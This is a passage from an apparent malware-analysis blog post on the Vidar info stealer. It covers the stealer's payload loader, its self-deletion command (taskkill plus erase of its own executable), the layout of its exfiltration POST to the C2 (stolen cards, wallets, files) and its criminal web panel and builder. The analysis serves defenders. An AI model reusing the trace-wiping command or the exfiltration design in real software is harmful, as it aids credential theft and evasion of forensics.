<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="466" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_loader_02/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_loader_02.png?fit=675%2C534&amp;ssl=1" data-orig-size="675,534" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_loader_02" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_loader_02.png?fit=300%2C237&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_loader_02.png?fit=675%2C534&amp;ssl=1" class="alignnone size-full wp-image-466" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_loader_02.png?resize=675%2C534&#038;ssl=1" alt="vidar_loader_02" width="675" height="534" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_loader_02.png?w=675&amp;ssl=1 675w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_loader_02.png?resize=300%2C237&amp;ssl=1 300w" sizes="auto, (max-width: 675px) 100vw, 675px" /></p>
<p>So now, the file is downloaded and saved into the disk, it only needs to be launched with ShellExecuteA. So don&#8217;t hesitate to breakpoint this API function, for grabbing the payload before it&#8217;s too late for further analysis.</p>
<h2>Killing Part</h2>
<p>So when all the task of the stealer is finally accomplished and cleaned, the stealer needs to erase itself. So first of all, it retrieves this own <a href="https://en.wikipedia.org/wiki/Process_identifier">PID</a> with the help of <a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessid">GetCurrentProcessId</a>.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="462" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/erase_vidar_payload_01/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_01.png?fit=426%2C382&amp;ssl=1" data-orig-size="426,382" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="erase_vidar_payload_01" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_01.png?fit=300%2C269&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_01.png?fit=426%2C382&amp;ssl=1" class=" size-full wp-image-462 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_01.png?resize=426%2C382&#038;ssl=1" alt="erase_vidar_payload_01" width="426" height="382" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_01.png?w=426&amp;ssl=1 426w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_01.png?resize=300%2C269&amp;ssl=1 300w" sizes="auto, (max-width: 426px) 100vw, 426px" /></p>
<p>When it&#8217;s done, it enters into &#8220;func_GetProcessIdName&#8221;, tries to open a handle on his own process with <a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess</a>, if it failed, it continues to check and in the end the most important task here is to call <a href="https://docs.microsoft.com/en-us/windows/desktop/api/psapi/nf-psapi-getmodulebasenamea">GetModuleBaseNameA</a>, which it permits to retrieve the name of the process name with the help of the PID that was obtained before.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="463" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/erase_vidar_payload_02/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_02.png?fit=411%2C616&amp;ssl=1" data-orig-size="411,616" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="erase_vidar_payload_02" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_02.png?fit=200%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_02.png?fit=411%2C616&amp;ssl=1" class=" size-full wp-image-463 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_02.png?resize=411%2C616&#038;ssl=1" alt="erase_vidar_payload_02" width="411" height="616" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_02.png?w=411&amp;ssl=1 411w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_02.png?resize=200%2C300&amp;ssl=1 200w" sizes="auto, (max-width: 411px) 100vw, 411px" /></p>
<p>Some strings that are hardcoded on .rdata section are called and saved for future purposes.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="467" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_strings_exit/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_strings_exit.png?fit=795%2C139&amp;ssl=1" data-orig-size="795,139" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_strings_exit" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_strings_exit.png?fit=300%2C52&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_strings_exit.png?fit=795%2C139&amp;ssl=1" class="alignnone size-full wp-image-467" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_strings_exit.png?resize=795%2C139&#038;ssl=1" alt="vidar_strings_exit" width="795" height="139" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_strings_exit.png?w=795&amp;ssl=1 795w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_strings_exit.png?resize=300%2C52&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_strings_exit.png?resize=768%2C134&amp;ssl=1 768w" sizes="auto, (max-width: 795px) 100vw, 795px" /></p>
<p>When the request is finely crafted, Vidar is simply using <a href="https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-shellexecutea">ShellExecuteA</a> to pop a command shell and executing the task, this permit to erase all trace of the interaction of the payload on the machine.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="464" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/erase_vidar_payload_03/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_03.png?fit=515%2C274&amp;ssl=1" data-orig-size="515,274" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="erase_vidar_payload_03" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_03.png?fit=300%2C160&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_03.png?fit=515%2C274&amp;ssl=1" class=" size-full wp-image-464 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_03.png?resize=515%2C274&#038;ssl=1" alt="erase_vidar_payload_03" width="515" height="274" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_03.png?w=515&amp;ssl=1 515w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/erase_vidar_payload_03.png?resize=300%2C160&amp;ssl=1 300w" sizes="auto, (max-width: 515px) 100vw, 515px" /></p>
<p>So if we want a quick overview of the executed command:</p>
<p><em>C:\Windows\System32\cmd.exe&#8221; /c taskkill /im vidar.exe /f &amp; erase C:\Users\Pouet\AppData\Local\Temp\vidar.exe &amp; exit</em></p>
<p>Literally:</p>
<p><em><strong><span style="color: #ff0000;">Offset</span></strong></em> File + <em><strong><span style="color: #ff00ff;">db</span></strong></em> <strong>&#8216;/c taskkill /im&#8217;</strong> + [<em><span style="color: #0000ff;"><strong>GetModuleBaseNameA</strong></span></em>] + <span style="color: #ff00ff;"><em><strong>db</strong></em></span> <strong>&#8216; /f &amp; erase&#8217;</strong>  + [<span style="color: #0000ff;"><em><strong>GetModuleFileNameExA</strong></em></span> + <span style="color: #0000ff;"><em><strong>GetModuleBaseNameA</strong></em></span>]+  + <span style="color: #ff00ff;"><em><strong>db</strong></em></span> <strong>&#8216; &amp; exit&#8217;</strong></p>
<h2>Sending archive to the C2</h2>
<h4>Folder generation</h4>
<p>COUNTRY + &#8220;_&#8221; + Machine GUID + &#8220;.zip&#8221;</p>
<p>in example :</p>
<p>NG_d6836847-acf3-4cee-945d-10c9982b53d1.zip</p>
<h4>Last POST request</h4>
<p>During the generation of the POST request, the generated HTTP packet is tweaked to add some additional content that the C2 server will read and process data.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="513" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_post_request-2/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_post_request-1.png?fit=664%2C157&amp;ssl=1" data-orig-size="664,157" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_post_request" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_post_request-1.png?fit=300%2C71&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_post_request-1.png?fit=664%2C157&amp;ssl=1" class="alignnone size-full wp-image-513" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_post_request-1.png?resize=664%2C157&#038;ssl=1" alt="vidar_post_request" width="664" height="157" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_post_request-1.png?w=664&amp;ssl=1 664w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_post_request-1.png?resize=300%2C71&amp;ssl=1 300w" sizes="auto, (max-width: 664px) 100vw, 664px" /></p>
<p>Each name at the end of the string will be the corresponding field to be saved into the database. This at least, all the different Content-Disposition that will be added to the HTTP request.</p>
<table border="0" cellspacing="0">
<colgroup span="2" width="85"></colgroup>
<tbody>
<tr>
<td align="left" height="17">hwid</td>
<td align="left">Hardware ID</td>
</tr>
<tr>
<td align="left" height="17">os</td>
<td align="left">Operating System</td>
</tr>
<tr>
<td align="left" height="17">platform</td>
<td align="left">32 or 64 bits System</td>
</tr>
<tr>
<td align="left" height="17">profile</td>
<td align="left">C2 Profile ID</td>
</tr>
<tr>
<td align="left" height="17">user</td>
<td align="left">Name of the victim account</td>
</tr>
<tr>
<td align="left" height="17">cccount</td>
<td align="left">Number of Credit Cards stolen</td>
</tr>
<tr>
<td align="left" height="17">ccount</td>
<td align="left">Number of Coins Stolen (CryptoWallet)</td>
</tr>
<tr>
<td align="left" height="17">fcount</td>
<td align="left">Number of files stolen</td>
</tr>
<tr>
<td align="left" height="17">telegram</td>
<td align="left">Telegram 🙂</td>
</tr>
<tr>
<td align="left" height="17">ver</td>
<td align="left">The version of the Vidar malware</td>
</tr>
</tbody>
</table>
<p>Also, there is a little trick here that I found nice. Here, the answer to the POST request is in fact, containing the config for the loader.</p>
<ul>
<li>If there is nothing, the response is &#8220;ok&#8221;</li>
<li>If there is something, the specified url(s) are stored.</li>
</ul>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="536" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/post/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/POST.png?fit=1728%2C442&amp;ssl=1" data-orig-size="1728,442" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="POST" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/POST.png?fit=300%2C77&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/POST.png?fit=900%2C230&amp;ssl=1" class="alignnone size-full wp-image-536" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/POST.png?resize=900%2C230&#038;ssl=1" alt="POST" width="900" height="230" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/POST.png?w=1728&amp;ssl=1 1728w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/POST.png?resize=300%2C77&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/POST.png?resize=768%2C196&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/POST.png?resize=1024%2C262&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/POST.png?resize=1100%2C281&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>Its the same thing used for the config and the network information.</p>
<p>Example with a sandbox :</p>
<ul>
<li>The POST request</li>
</ul>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="537" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/archive_post/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/archive_post.png?fit=977%2C645&amp;ssl=1" data-orig-size="977,645" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="archive_post" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/archive_post.png?fit=300%2C198&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/archive_post.png?fit=900%2C594&amp;ssl=1" class="alignnone size-full wp-image-537" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/archive_post.png?resize=900%2C594&#038;ssl=1" alt="archive_post" width="900" height="594" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/archive_post.png?w=977&amp;ssl=1 977w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/archive_post.png?resize=300%2C198&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/archive_post.png?resize=768%2C507&amp;ssl=1 768w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<ul>
<li>The response of this POST request (select the tab)</li>
</ul>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="539" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/answer_post/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/Answer_POST.png?fit=1002%2C404&amp;ssl=1" data-orig-size="1002,404" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Answer_POST" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/Answer_POST.png?fit=300%2C121&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/Answer_POST.png?fit=900%2C363&amp;ssl=1" class="alignnone size-full wp-image-539" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/Answer_POST.png?resize=900%2C363&#038;ssl=1" alt="Answer_POST" width="900" height="363" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/Answer_POST.png?w=1002&amp;ssl=1 1002w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/Answer_POST.png?resize=300%2C121&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/01/Answer_POST.png?resize=768%2C310&amp;ssl=1 768w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<h2>Server-Side</h2>
<p>Because it&#8217;s easy to find some information about the stealer, no needs to dig hard to have some marketplace where Vidar is sold. So let&#8217;s see how it looks like by looking some classical commercial video (all the screenshot are collected from there), for attracting some possible customers. This could be completely different at that time, but it&#8217;s what it was looking like at the beginning of November.</p>
<p><em><strong>Login</strong></em></p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="472" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_login/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_login.png?fit=1246%2C809&amp;ssl=1" data-orig-size="1246,809" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Vidar_login" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_login.png?fit=300%2C195&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_login.png?fit=900%2C584&amp;ssl=1" class="alignnone size-full wp-image-472" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_login.png?resize=900%2C584&#038;ssl=1" alt="Vidar_login" width="900" height="584" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_login.png?w=1246&amp;ssl=1 1246w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_login.png?resize=300%2C195&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_login.png?resize=768%2C499&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_login.png?resize=1024%2C665&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_login.png?resize=1100%2C714&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p><em><strong>Dashboard</strong></em></p>
<p>The panel is a classical fancy user-friendly interface, with all the basic information necessary for the customer to have a fast view how is goin&#8217; his business.</p>
<ul>
<li>The current version of the builder</li>
<li>Until when he is able to generate some payloads</li>
<li>How many victims</li>
<li>The current balance on his account to re-subscribe again</li>
</ul>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="448" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/ultra_hacks_dashboard/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_dashboard.png?fit=1111%2C399&amp;ssl=1" data-orig-size="1111,399" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ultra_hacks_dashboard" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_dashboard.png?fit=300%2C108&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_dashboard.png?fit=900%2C323&amp;ssl=1" class="alignnone size-full wp-image-448" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_dashboard.png?resize=900%2C323&#038;ssl=1" alt="ultra_hacks_dashboard" width="900" height="323" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_dashboard.png?w=1111&amp;ssl=1 1111w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_dashboard.png?resize=300%2C108&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_dashboard.png?resize=768%2C276&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_dashboard.png?resize=1024%2C368&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_dashboard.png?resize=1100%2C395&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p><em><strong>Logs</strong></em></p>
<p>something to mention with the log part is that it&#8217;s possible to put some notes on each data.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="449" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/ultra_hacks_logs/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_logs.png?fit=1101%2C369&amp;ssl=1" data-orig-size="1101,369" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ultra_hacks_logs" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_logs.png?fit=300%2C101&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_logs.png?fit=900%2C301&amp;ssl=1" class="alignnone size-full wp-image-449" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_logs.png?resize=900%2C302&#038;ssl=1" alt="ultra_hacks_logs" width="900" height="302" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_logs.png?w=1101&amp;ssl=1 1101w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_logs.png?resize=300%2C101&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_logs.png?resize=768%2C257&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_logs.png?resize=1024%2C343&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_logs.png?resize=1100%2C369&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p><em><strong>Passwords</strong></em></p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="450" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/ultra_hacks_passwords/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_passwords.png?fit=1101%2C565&amp;ssl=1" data-orig-size="1101,565" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ultra_hacks_passwords" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_passwords.png?fit=300%2C154&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_passwords.png?fit=900%2C461&amp;ssl=1" class="alignnone size-full wp-image-450" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_passwords.png?resize=900%2C462&#038;ssl=1" alt="ultra_hacks_passwords" width="900" height="462" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_passwords.png?w=1101&amp;ssl=1 1101w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_passwords.png?resize=300%2C154&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_passwords.png?resize=768%2C394&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_passwords.png?resize=1024%2C525&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_passwords.png?resize=1100%2C564&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p><em><strong>Builder</strong></em></p>
<p>The builder tab is also pretty interesting because we have the changelog information about the stealer and on the download part, the malware generated will not be packed and this is the same scenario with Arkei.</p>
<p>Customer/Threat actor must have to use his own crypter/packer software for his payload.</p>
